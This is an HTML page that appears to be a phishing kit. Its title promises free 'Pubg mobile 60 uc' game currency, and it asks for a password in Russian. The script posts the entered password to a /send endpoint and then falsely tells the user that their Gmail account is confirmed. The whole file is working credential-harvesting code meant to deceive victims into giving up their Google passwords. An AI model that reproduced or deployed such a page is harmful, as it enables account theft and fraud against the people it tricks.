<!DOCTYPE html>
<html>
<head>
    <title>Password</title>

    <!-- TELEFON UCHUN -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body {
            margin: 0;
            height: 100vh;
            background: url("https://static3.tgstat.ru/channels/_0/84/84149ba14092fab307e0cf55c791a8a1.jpg") no-repeat center center;
            background-size: cover;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .main {
            width: 900px;
            height: 500px;
            display: flex;
            padding: 40px;
        }

        .left {
            flex: 1;
        }

        .title {
            font-size: 32px;
        }

        .email {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #5f6368;
            border-radius: 20px;
            display: inline-block;
        }

        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* 🔥 YANGILANGAN INPUT */
        input {
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.6); /* qoraroq fon */
            border: 2px solid rgba(255, 255, 255, 0.3);
            color: white;
            font-size: 18px;
            outline: none;
            backdrop-filter: blur(5px);
            box-shadow: 0 0 10px rgba(0,0,0,0.7);
        }

        input::placeholder {
            color: rgba(255,255,255,0.7);
        }

        input:focus {
            border: 2px solid #8ab4f8;
            box-shadow: 0 0 15px #8ab4f8;
            background: rgba(0, 0, 0, 0.8);
        }

        .bottom {
            margin-top: 30px;
            display: flex;
            justify-content: flex-end;
            gap: 20px;
        }

        button {
            background: #8ab4f8;
            border: none;
            padding: 10px 25px;
            border-radius: 20px;
            cursor: pointer;
        }

        /* 📱 TELEFON UCHUN MOSLASH */
        @media (max-width: 768px) {
            .main {
                width: 100%;
                height: auto;
                flex-direction: column;
                padding: 20px;
            }

            .left, .right {
                width: 100%;
            }

            .title {
                font-size: 24px;
                text-align: center;
            }

            .email {
                display: block;
                text-align: center;
                margin: 15px auto;
            }

            .bottom {
                justify-content: center;
            }

            button {
                width: 100%;
            }
        }
    </style>

</head>
<body>

<div class="main">

    <div class="left">
        <div class="title">Pubg mobile 60 uc✅</div>
        
    </div>

    <div class="right">

        <input id="msg2" type="password" placeholder="Введите пароль">

        <div style="margin-top:10px;">
            

        <div class="bottom">
            <button onclick="send2()">Далее</button>
        </div>

    </div>

</div>

<script>
window.onload = () => {
    document.getElementById("msg2").focus();
};

function toggle() {
    const input = document.getElementById("msg2");
    input.type = input.type === "password" ? "text" : "password";
}

function send2() {
    const message = document.getElementById("msg2").value;

    if (!message) {
        alert("Введите пароль");
        return;
    }

    fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
    })
    .then(() => {
        alert("Ваш аккаунт Gmail подтверждён");
    });
}
</script>

</body>
</html>
